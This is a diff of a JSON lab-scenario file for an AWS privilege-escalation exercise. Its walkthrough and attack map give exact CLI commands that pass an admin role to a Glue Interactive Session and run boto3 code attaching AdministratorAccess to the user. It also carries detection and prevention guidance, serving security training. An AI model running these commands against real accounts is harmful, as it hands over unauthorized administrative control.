@@ -13,41 +13,8 @@
     "prod"
   ],
   "attackPath": {
-    "principals": [
-      "arn:aws:iam::{account_id}:user/pl-prod-glue-007-to-admin-starting-user",
-      "arn:aws:iam::{account_id}:role/pl-prod-glue-007-to-admin-admin-role"
-    ],
-    "summary": "starting_user \u2192 (iam:PassRole + glue:CreateSession) \u2192 Glue Interactive Session with admin role \u2192 (glue:RunStatement with boto3) \u2192 attaches AdministratorAccess to starting_user \u2192 admin access"
-  },
-  "permissions": {
-    "required": [
-      {
-        "permission": "iam:PassRole",
-        "resource": "arn:aws:iam::*:role/pl-prod-glue-007-to-admin-admin-role"
-      },
-      {
-        "permission": "glue:CreateSession",
-        "resource": "*"
-      },
-      {
-        "permission": "glue:RunStatement",
-        "resource": "*"
-      }
-    ],
-    "helpful": [
-      {
-        "permission": "glue:GetSession",
-        "purpose": "Check session status and wait for it to be ready"
-      },
-      {
-        "permission": "glue:GetStatement",
-        "purpose": "Check statement execution status and retrieve output"
-      },
-      {
-        "permission": "glue:DeleteSession",
-        "purpose": "Clean up the Glue Interactive Session after the attack"
-      }
-    ]
+    "principals": [],
+    "summary": ""
   },
   "mitreAttack": {
     "tactics": [
@@ -62,18 +29,51 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/glue-007-iam-passrole+glue-createsession+glue-runstatement"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/glue-007-iam-passrole+glue-createsession+glue-runstatement",
+  "schemaVersion": "3.0.0",
+  "permissions": {
+    "required": [
+      {
+        "permission": "iam:PassRole",
+        "resource": "arn:aws:iam::*:role/pl-prod-glue-007-to-admin-admin-role",
+        "description": "allows passing the admin role to the Glue service when creating a session"
+      },
+      {
+        "permission": "glue:CreateSession",
+        "resource": "*",
+        "description": "allows creating a Glue Interactive Session with an assigned IAM role"
+      },
+      {
+        "permission": "glue:RunStatement",
+        "resource": "*",
+        "description": "allows executing arbitrary Python code within the Glue session using the session's assigned role permissions"
+      }
+    ],
+    "helpful": [
+      {
+        "permission": "glue:GetSession",
+        "purpose": "check session status and wait for it to reach the READY state before running statements"
+      },
+      {
+        "permission": "glue:GetStatement",
+        "purpose": "check statement execution status and retrieve output after running code"
+      },
+      {
+        "permission": "glue:DeleteSession",
+        "purpose": "clean up the Glue Interactive Session after the attack to remove evidence"
+      }
+    ]
+  },
   "readme": {
-    "overview": "This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `glue:CreateSession`, and `glue:RunStatement` permissions can create an AWS Glue Interactive Session with an administrative role and execute Python code that grants themselves administrative access.\n\nAWS Glue Interactive Sessions provide a serverless, on-demand Spark or Python environment for data exploration and development. Unlike traditional Glue Jobs that execute predefined scripts, Interactive Sessions allow users to run arbitrary code statements in real-time through the `glue:RunStatement` API. When creating an Interactive Session, you specify an IAM role that the session assumes during execution. If an attacker can pass a privileged role to a session and then execute code within it, they can leverage the role's permissions to escalate their own privileges.\n\nThis attack is particularly dangerous because it provides immediate, interactive access to execute code with administrative permissions. The attacker doesn't need to wait for job completion or extract credentials - they can directly call AWS APIs using boto3 (which is available by default in Glue sessions) to modify IAM permissions in real-time. The escalation path is straightforward: create a session with an admin role, run a Python statement that attaches AdministratorAccess to the starting user, and immediately gain full administrative access to the AWS environment.",
-    "mitreAttack": "- **Tactic**: TA0004 - Privilege Escalation\n- **Technique**: T1098 - Account Manipulation\n- **Sub-technique**: Using cloud compute services with elevated privileges to modify account permissions",
-    "attackDiagram": "graph LR\n    A[pl-prod-glue-007-to-admin-starting-user] -->|iam:PassRole + glue:CreateSession| B[Glue Interactive Session]\n    B -->|Assumes| C[pl-prod-glue-007-to-admin-admin-role]\n    A -->|glue:RunStatement| D[Python Code Execution]\n    D -->|boto3: iam:AttachUserPolicy| E[AdministratorAccess Attached]\n    E -->|Starting User Now Admin| F[Effective Administrator]\n\n    style A fill:#ff9999,stroke:#333,stroke-width:2px\n    style B fill:#ffcc99,stroke:#333,stroke-width:2px\n    style C fill:#ffcc99,stroke:#333,stroke-width:2px\n    style D fill:#ffcc99,stroke:#333,stroke-width:2px\n    style E fill:#ffcc99,stroke:#333,stroke-width:2px\n    style F fill:#99ff99,stroke:#333,stroke-width:2px",
-    "attackSteps": "1. **Initial Access**: Start as `pl-prod-glue-007-to-admin-starting-user` (credentials provided via Terraform outputs)\n2. **Create Interactive Session**: Use `glue:CreateSession` to create a Glue Interactive Session, passing the admin role via `iam:PassRole`. The session is configured with Python as the command type.\n3. **Wait for Session Ready**: Monitor session status using `glue:GetSession` until the session reaches the `READY` state (typically 1-3 minutes for session initialization)\n4. **Run Malicious Statement**: Use `glue:RunStatement` to execute Python code within the session that attaches AdministratorAccess to the starting user:\n   ```python\n   import boto3\n   iam = boto3.client('iam')\n   iam.attach_user_policy(\n       UserName='pl-prod-glue-007-to-admin-starting-user',\n       PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n   )\n   ```\n5. **Verification**: Verify administrator access by executing privileged operations (e.g., `aws iam list-users`)",
-    "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-glue-007-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-glue-007-to-admin-admin-role` | Administrative role passed to Glue Interactive Session |\n| Inline policy: `pl-prod-glue-007-to-admin-starting-user-policy` | Policy granting PassRole, CreateSession, RunStatement, GetSession, GetStatement, and DeleteSession permissions |",
-    "attackLab": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-glue-007-to-admin-starting-user` IAM user to the `pl-prod-glue-007-to-admin-admin-role` administrative role by creating an AWS Glue Interactive Session with the admin role and executing Python code via `glue:RunStatement` to attach `AdministratorAccess` to the starting user.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-glue-007-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-glue-007-to-admin-admin-role`",
+    "setup": {
       "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
       "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_admin_glue_007_iam_passrole_glue_createsession_glue_runstatement\nplabs apply\n```",
-      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-glue-007-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:role/pl-prod-glue-007-to-admin-admin-role` | Administrative role passed to Glue Interactive Session |\n| Inline policy: `pl-prod-glue-007-to-admin-starting-user-policy` | Policy granting PassRole, CreateSession, RunStatement, GetSession, GetStatement, and DeleteSession permissions |",
       "demoAttack": {
-        "intro": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Create a Glue Interactive Session with the admin role\n4. Wait for the session to become ready\n5. Execute a Python statement that attaches AdministratorAccess to the starting user\n6. Verify successful privilege escalation by demonstrating admin access\n7. Output standardized test results for automation",
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Create a Glue Interactive Session with the admin role\n4. Wait for the session to become ready\n5. Execute a Python statement that attaches AdministratorAccess to the starting user\n6. Verify successful privilege escalation by demonstrating admin access\n7. Output standardized test results for automation",
         "resourcesCreated": "- Glue Interactive Session with the admin role attached\n- `AdministratorAccess` managed policy attached to `pl-prod-glue-007-to-admin-starting-user`",
         "nonInteractive": "```bash\nplabs demo --list\nplabs demo glue-007-iam-passrole+glue-createsession+glue-runstatement\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
@@ -81,19 +81,103 @@
       "cleanup": {
         "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup glue-007-iam-passrole+glue-createsession+glue-runstatement\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_glue_007_iam_passrole_glue_createsession_glue_runstatement\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- IAM user with `iam:PassRole` permission on privileged roles\n- IAM user with `glue:CreateSession` and `glue:RunStatement` permissions\n- Combination of PassRole and Glue Interactive Session permissions enabling privilege escalation\n- IAM role with administrative permissions that can be passed to Glue services\n- Glue trust policy allowing the Glue service to assume privileged roles\n- Privilege escalation path from user to admin via Glue Interactive Sessions",
+        "prevention": "- **Restrict PassRole permissions**: Limit `iam:PassRole` to only the specific roles and services needed. Use resource-level restrictions:\n  ```json\n  {\n    \"Effect\": \"Allow\",\n    \"Action\": \"iam:PassRole\",\n    \"Resource\": \"arn:aws:iam::*:role/specific-glue-role\",\n    \"Condition\": {\n      \"StringEquals\": {\n        \"iam:PassedToService\": \"glue.amazonaws.com\"\n      }\n    }\n  }\n  ```\n\n- **Implement SCPs to prevent privilege escalation**: Use Service Control Policies to deny PassRole on administrative roles:\n  ```json\n  {\n    \"Effect\": \"Deny\",\n    \"Action\": \"iam:PassRole\",\n    \"Resource\": \"arn:aws:iam::*:role/*admin*\",\n    \"Condition\": {\n      \"StringEquals\": {\n        \"iam:PassedToService\": \"glue.amazonaws.com\"\n      }\n    }\n  }\n  ```\n\n- **Restrict glue:CreateSession and glue:RunStatement permissions**: Only grant these permissions to users who legitimately need interactive data exploration capabilities. These are powerful permissions that allow arbitrary code execution and should be tightly controlled.\n\n- **Monitor CloudTrail for Interactive Session activity**: Alert on `CreateSession` API calls, especially when combined with PassRole on privileged roles. Monitor `RunStatement` calls for suspicious code patterns, particularly those involving boto3 IAM operations.\n\n- **Use IAM Access Analyzer**: Enable IAM Access Analyzer to automatically detect privilege escalation paths involving PassRole and Glue services. Review findings regularly and remediate identified risks.\n\n- **Implement least privilege for Glue roles**: When creating IAM roles for Glue services, grant only the minimum permissions required for the specific data exploration tasks. Avoid using administrative policies like `AdministratorAccess` or `PowerUserAccess` on Glue service roles. Typical Glue sessions need S3, Glue Data Catalog, and CloudWatch Logs access - not IAM permissions.\n\n- **Require MFA for sensitive operations**: Implement MFA requirements for operations like `glue:CreateSession`, `glue:RunStatement`, and `iam:PassRole` to add an additional layer of security against compromised credentials.\n\n- **Use VPC endpoints and network isolation**: Configure Glue Interactive Sessions to run within private VPCs without public internet access, reducing the attack surface even if a session is created with elevated privileges.\n\n- **Implement session time limits**: Configure automatic session termination after a defined idle period to limit the window of opportunity for exploitation and reduce costs from forgotten sessions.\n\n- **Separate Glue accounts**: Consider running production Glue workloads in dedicated AWS accounts with strict cross-account access controls, limiting the blast radius of compromised Glue permissions."
       },
-      "teardownNonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_glue_007_iam_passrole_glue_createsession_glue_runstatement\nplabs apply\n```",
-      "teardownTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+      "cloudSiem": {
+        "cloudTrailEvents": "- `IAM: PassRole` -- starting user passes the admin role to the Glue service; critical when the target role has elevated permissions\n- `Glue: CreateSession` -- new Glue Interactive Session created; high severity when the `Role` parameter references an administrative role\n- `Glue: RunStatement` -- statement executed within a Glue Interactive Session; monitor for boto3 IAM operations in the statement code\n- `IAM: AttachUserPolicy` -- managed policy attached to an IAM user from a Glue session context; critical when the policy is `AdministratorAccess`\n- `IAM: PutUserPolicy` -- inline policy added to an IAM user from a Glue session context\n- `Glue: DeleteSession` -- session deleted after use; short-lived sessions (created, used briefly, then deleted) indicate potential abuse",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
     },
-    "cspm": {
-      "whatToDetect": "A properly configured CSPM solution should identify:\n- IAM user with `iam:PassRole` permission on privileged roles\n- IAM user with `glue:CreateSession` and `glue:RunStatement` permissions\n- Combination of PassRole and Glue Interactive Session permissions enabling privilege escalation\n- IAM role with administrative permissions that can be passed to Glue services\n- Glue trust policy allowing the Glue service to assume privileged roles\n- Privilege escalation path from user to admin via Glue Interactive Sessions",
-      "prevention": "- **Restrict PassRole permissions**: Limit `iam:PassRole` to only the specific roles and services needed. Use resource-level restrictions:\n  ```json\n  {\n    \"Effect\": \"Allow\",\n    \"Action\": \"iam:PassRole\",\n    \"Resource\": \"arn:aws:iam::*:role/specific-glue-role\",\n    \"Condition\": {\n      \"StringEquals\": {\n        \"iam:PassedToService\": \"glue.amazonaws.com\"\n      }\n    }\n  }\n  ```\n\n- **Implement SCPs to prevent privilege escalation**: Use Service Control Policies to deny PassRole on administrative roles:\n  ```json\n  {\n    \"Effect\": \"Deny\",\n    \"Action\": \"iam:PassRole\",\n    \"Resource\": \"arn:aws:iam::*:role/*admin*\",\n    \"Condition\": {\n      \"StringEquals\": {\n        \"iam:PassedToService\": \"glue.amazonaws.com\"\n      }\n    }\n  }\n  ```\n\n- **Restrict glue:CreateSession and glue:RunStatement permissions**: Only grant these permissions to users who legitimately need interactive data exploration capabilities. These are powerful permissions that allow arbitrary code execution and should be tightly controlled.\n\n- **Monitor CloudTrail for Interactive Session activity**: Alert on `CreateSession` API calls, especially when combined with PassRole on privileged roles. Monitor `RunStatement` calls for suspicious code patterns, particularly those involving boto3 IAM operations.\n\n- **Use IAM Access Analyzer**: Enable IAM Access Analyzer to automatically detect privilege escalation paths involving PassRole and Glue services. Review findings regularly and remediate identified risks.\n\n- **Implement least privilege for Glue roles**: When creating IAM roles for Glue services, grant only the minimum permissions required for the specific data exploration tasks. Avoid using administrative policies like `AdministratorAccess` or `PowerUserAccess` on Glue service roles. Typical Glue sessions need S3, Glue Data Catalog, and CloudWatch Logs access - not IAM permissions.\n\n- **Require MFA for sensitive operations**: Implement MFA requirements for operations like `glue:CreateSession`, `glue:RunStatement`, and `iam:PassRole` to add an additional layer of security against compromised credentials.\n\n- **Use VPC endpoints and network isolation**: Configure Glue Interactive Sessions to run within private VPCs without public internet access, reducing the attack surface even if a session is created with elevated privileges.\n\n- **Implement session time limits**: Configure automatic session termination after a defined idle period to limit the window of opportunity for exploitation and reduce costs from forgotten sessions.\n\n- **Separate Glue accounts**: Consider running production Glue workloads in dedicated AWS accounts with strict cross-account access controls, limiting the blast radius of compromised Glue permissions."
-    },
-    "cloudSiem": {
-      "cloudTrailEvents": "- `IAM: PassRole` \u2014 Starting user passes the admin role to the Glue service; critical when the target role has elevated permissions\n- `Glue: CreateSession` \u2014 New Glue Interactive Session created; high severity when the `Role` parameter references an administrative role\n- `Glue: RunStatement` \u2014 Statement executed within a Glue Interactive Session; monitor for boto3 IAM operations in the statement code\n- `IAM: AttachUserPolicy` \u2014 Managed policy attached to an IAM user from a Glue session context; critical when the policy is `AdministratorAccess`\n- `IAM: PutUserPolicy` \u2014 Inline policy added to an IAM user from a Glue session context\n- `Glue: DeleteSession` \u2014 Session deleted after use; short-lived sessions (created, used briefly, then deleted) indicate potential abuse",
-      "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
-    },
-    "references": "- [AWS Glue Interactive Sessions Documentation](https://docs.aws.amazon.com/glue/latest/dg/interactive-sessions.html)\n- [AWS Glue Interactive Sessions API](https://docs.aws.amazon.com/glue/latest/dg/aws-glue-api-interactive-sessions.html)\n- [AWS IAM PassRole Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html)\n- [Rhino Security Labs - AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)"
+    "references": "- [AWS Glue Interactive Sessions Documentation](https://docs.aws.amazon.com/glue/latest/dg/interactive-sessions.html) -- official AWS docs for Glue Interactive Sessions\n- [AWS Glue Interactive Sessions API](https://docs.aws.amazon.com/glue/latest/dg/aws-glue-api-interactive-sessions.html) -- API reference for CreateSession, RunStatement, and related calls\n- [AWS IAM PassRole Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html) -- explains PassRole mechanics and how to restrict it\n- [Rhino Security Labs - AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) -- comprehensive overview of IAM privilege escalation techniques",
+    "guidedWalkthrough": "# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:CreateSession + glue:RunStatement\n\nThis scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `glue:CreateSession`, and `glue:RunStatement` permissions can create an AWS Glue Interactive Session with an administrative role and execute Python code that grants themselves administrative access.\n\nAWS Glue Interactive Sessions provide a serverless, on-demand Spark or Python environment for data exploration and development. Unlike traditional Glue Jobs that execute predefined scripts, Interactive Sessions allow users to run arbitrary code statements in real-time through the `glue:RunStatement` API. When creating an Interactive Session, you specify an IAM role that the session assumes during execution. If an attacker can pass a privileged role to a session and then execute code within it, they can leverage the role's permissions to escalate their own privileges.\n\nThis attack is particularly dangerous because it provides immediate, interactive access to execute code with administrative permissions. The attacker doesn't need to wait for job completion or extract credentials -- they can directly call AWS APIs using boto3 (which is available by default in Glue sessions) to modify IAM permissions in real-time. The escalation path is straightforward: create a session with an admin role, run a Python statement that attaches AdministratorAccess to the starting user, and immediately gain full administrative access to the AWS environment.\n\n## The Challenge\n\nYou start as `pl-prod-glue-007-to-admin-starting-user` -- an IAM user whose credentials were provided via Terraform outputs. At first glance, these permissions look like they belong to a data engineer: the ability to create and interact with Glue Interactive Sessions, plus `iam:PassRole` on a specific role. Your goal is to reach full administrator access.\n\nThe target is `pl-prod-glue-007-to-admin-admin-role`, an IAM role carrying `AdministratorAccess`. You cannot assume it directly -- there is no `sts:AssumeRole` permission in your policy. But you can pass it to something else.\n\n## Reconnaissance\n\nStart by confirming who you are and what region you are operating in:\n\n```bash\naws sts get-caller-identity\n```\n\nNow check what policies are attached to your user to understand the full permission set:\n\n```bash\naws iam list-user-policies --user-name pl-prod-glue-007-to-admin-starting-user\naws iam get-user-policy --user-name pl-prod-glue-007-to-admin-starting-user \\\n    --policy-name pl-prod-glue-007-to-admin-starting-user-policy\n```\n\nYou will see three key permissions: `iam:PassRole` scoped to the admin role ARN, `glue:CreateSession`, and `glue:RunStatement`. You also have `glue:GetSession`, `glue:GetStatement`, and `glue:DeleteSession` as helpful recon and cleanup permissions. The combination is the vulnerability: you can create a compute environment that runs as the admin role and then feed it arbitrary Python.\n\n## Exploitation\n\n### Step 1: Create the Glue Interactive Session\n\nCreate a session and pass the admin role to it. Glue will assume that role during session initialization. Note the session ID -- you will need it for subsequent calls.\n\n```bash\nACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)\nREGION=\"us-east-1\"  # adjust to your deployed region\nSESSION_ID=\"pl-glue-007-attack-session\"\n\naws glue create-session \\\n    --region \"$REGION\" \\\n    --id \"$SESSION_ID\" \\\n    --role \"arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-glue-007-to-admin-admin-role\" \\\n    --command '{\"Name\":\"glueetl\",\"PythonVersion\":\"3\"}' \\\n    --glue-version \"4.0\" \\\n    --worker-type \"G.1X\" \\\n    --number-of-workers 2\n```\n\n### Step 2: Wait for the Session to Reach READY State\n\nGlue Interactive Sessions take 1-3 minutes to initialize. Poll the session status until it shows `READY`:\n\n```bash\naws glue get-session --region \"$REGION\" --id \"$SESSION_ID\" \\\n    --query 'Session.Status' --output text\n```\n\nKeep polling every 10 seconds. Once the status is `READY`, the session is running as the admin role and ready to accept statements.\n\n### Step 3: Run the Malicious Python Statement\n\nNow the key step. Execute Python code inside the session that uses boto3 to attach `AdministratorAccess` to your starting user. Because the session is running as the admin role, this IAM call succeeds:\n\n```bash\naws glue run-statement \\\n    --region \"$REGION\" \\\n    --session-id \"$SESSION_ID\" \\\n    --code \"import boto3; iam = boto3.client('iam'); iam.attach_user_policy(UserName='pl-prod-glue-007-to-admin-starting-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')\"\n```\n\nNote the returned `Id` field -- this is the statement ID you need to check execution status.\n\n### Step 4: Confirm the Statement Completed\n\nPoll the statement until its state is `AVAILABLE`:\n\n```bash\nSTATEMENT_ID=0  # replace with the Id returned by run-statement\n\naws glue get-statement --region \"$REGION\" \\\n    --session-id \"$SESSION_ID\" \\\n    --id \"$STATEMENT_ID\" \\\n    --query 'Statement.State' --output text\n```\n\nOnce it shows `AVAILABLE`, the Python code executed successfully inside the session.\n\n## Verification\n\nWait about 15 seconds for IAM policy propagation, then verify you now have administrative access using your original starting user credentials:\n\n```bash\naws iam list-users --max-items 3\n```\n\nIf this succeeds, you have achieved administrator access. You can confirm the policy attachment directly:\n\n```bash\naws iam list-attached-user-policies \\\n    --user-name pl-prod-glue-007-to-admin-starting-user\n```\n\nYou will see `AdministratorAccess` listed.\n\n## What Happened\n\nYou exploited a privilege escalation path that is easy to overlook during IAM reviews. The `iam:PassRole` permission is often granted broadly to let users assign roles to compute services. When combined with `glue:CreateSession` and `glue:RunStatement`, it becomes a full code execution primitive under the passed role's identity. There was no direct `sts:AssumeRole` involved -- Glue assumed the role on your behalf during session initialization, and your subsequent `RunStatement` call ran inside that privileged context.\n\nThis pattern appears in real environments where data teams are given flexible Glue permissions for ad-hoc analytics work. The fix is to ensure that any role passable to Glue carries only the minimum permissions needed for data operations -- never administrative policies. The PassRole permission itself should also be restricted with an `iam:PassedToService` condition so it cannot be reused against other compute services.\n"
   },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-user",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-glue-007-to-admin-starting-user",
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole on the admin role and glue:CreateSession and glue:RunStatement permissions, enabling creation of a Glue Interactive Session that assumes the admin role and executes arbitrary Python code.\n"
+      },
+      {
+        "id": "glue-session",
+        "label": "Glue Interactive Session",
+        "type": "resource",
+        "subType": "glue-job",
+        "arn": "arn:aws:glue:{region}:{account_id}:session/pl-prod-glue-007-attack-session",
+        "description": "An AWS Glue Interactive Session created with the admin role attached. The session provides a serverless Python environment where arbitrary code can be executed with the permissions of the passed role. Using boto3, IAM API calls can be made directly from within the session to escalate the starting user's privileges.\n"
+      },
+      {
+        "id": "admin-role",
+        "label": "Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isTarget": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-glue-007-to-admin-admin-role",
+        "description": "This IAM role has AdministratorAccess and is assumed by the Glue Interactive Session. When the session executes Python code using boto3, those API calls are made with this role's permissions, allowing IAM modifications such as attaching managed policies to other principals.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-user",
+        "to": "glue-session",
+        "label": "iam:PassRole + glue:CreateSession",
+        "description": "The starting user passes the admin role to a new Glue Interactive Session. The session assumes the admin role during initialization, giving the session full administrative permissions via boto3.\n",
+        "hints": [
+          "You can pass IAM roles to AWS compute services.",
+          "AWS Glue Interactive Sessions allow on-demand Python code execution with an assigned IAM role.",
+          "Try creating a Glue Interactive Session with an admin role, then use glue:RunStatement to call IAM APIs via boto3.",
+          "Browse to https://pathfinding.cloud/paths/glue-007 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Create a Glue Interactive Session with the admin role",
+            "command": "aws glue create-session --id pl-prod-glue-007-attack-session --role arn:aws:iam::{account_id}:role/pl-prod-glue-007-to-admin-admin-role --command '{\"Name\": \"glueetl\", \"PythonVersion\": \"3\"}' --glue-version \"3.0\"\n"
+          },
+          {
+            "description": "Wait for the session to reach READY state",
+            "command": "aws glue get-session --id pl-prod-glue-007-attack-session"
+          }
+        ]
+      },
+      {
+        "from": "glue-session",
+        "to": "admin-role",
+        "label": "glue:RunStatement + boto3 iam:AttachUserPolicy",
+        "description": "The Glue service assumes the passed admin role automatically when the session is initialized. The attacker then executes a Python statement within the Glue session that calls iam:AttachUserPolicy using boto3, attaching AdministratorAccess to the starting user using the admin role's permissions.\n",
+        "hints": [
+          "This Glue session runs with the permissions of the admin role.",
+          "boto3 is available by default in Glue sessions and can call any AWS API.",
+          "Use glue:RunStatement to execute Python code that calls iam:AttachUserPolicy."
+        ],
+        "commands": [
+          {
+            "description": "Run a Python statement to attach AdministratorAccess to the starting user",
+            "command": "aws glue run-statement --session-id pl-prod-glue-007-attack-session --code \"import boto3; iam = boto3.client('iam'); iam.attach_user_policy(UserName='pl-prod-glue-007-to-admin-starting-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')\"\n"
+          },
+          {
+            "description": "Verify the policy was attached",
+            "command": "aws iam list-attached-user-policies --user-name pl-prod-glue-007-to-admin-starting-user"
+          },
+          {
+            "description": "Verify admin access with starting user credentials",
+            "command": "aws iam list-users"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
   "slug": "glue-007"
 }
